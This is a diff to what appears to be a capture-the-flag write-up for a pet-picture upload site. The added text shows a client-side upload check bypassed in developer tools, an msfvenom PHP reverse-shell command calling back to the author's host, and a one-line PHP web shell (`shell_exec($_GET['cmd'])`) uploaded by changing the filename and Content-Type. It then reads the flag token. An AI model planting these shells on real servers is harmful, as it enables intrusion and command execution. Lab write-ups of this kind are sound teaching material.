@@ -49,6 +49,7 @@ The cat lady in the neighborhood develops a website to exchange picz of her prec
 - Let's check the source for JavaScript.
 - Using my favorite browser, Firefox - obviously! -, pressing strl+shift+i opens the developer tools.
 - Searching for "IMAGE FILES ONLY" in the source reveals, the button.style.visibility is set to "hidden". But we don't want that. Let's change it to "visible". Et voilà! We can upload .php files now.
+### 1.
 - I'm too lazy to write php myself... so I just generate my webshell using Metasploits msfvenom:
     - Syntax: `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o phpreverseshell.php`
     - Note: I own the domain example.org and I have a port forwarding set up to my local machine on tcp 4444.
@@ -58,6 +59,17 @@ The cat lady in the neighborhood develops a website to exchange picz of her prec
 - ... I get my secure kitty link <IP>/upload/0ffc7b...c9b6d.php
 - ... and opening it in the browser, gives me my hoped for shell.
 - Note: Using a reverse shell circumvents server side firewalling. However, it seems there is none. So, the same shit flies using a bind shell.
+- Let's look around a bit, shell we? (pun intended)
+    - `whoami` ... so far so expected.
+    - `ls -al /` ... wait... what??? What do we have here? Can we read the token already? Yes, we can!
+    - `cat /DS-token`
+### 2.
+- I don't need a reverse shell! I'll just use my trusty browser and the developer tools.
+  - After uploading an example image I found out that I can just resend the packet with different Content!
+  - So this time I'm just gonna change "filename=example.png" to "filename=example.php", and "Content-Type: image/png" with "Content-Type: text/html" 
+  - And replacing the Image data with `<?php echo shell_exec($_GET['cmd']); ?>`
+- Nice! When following the link of the Image we can now put a Querystring behind in the browser to execute commands!
+- For example `filename.php?cmd=ls`
 - Let's look around a bit, shell we? (pun intended)
     - `whoami` ... so far so expected.
     - `ls -al /` ... wait... what??? What do we have here? Can we read the token already? Yes, we can!
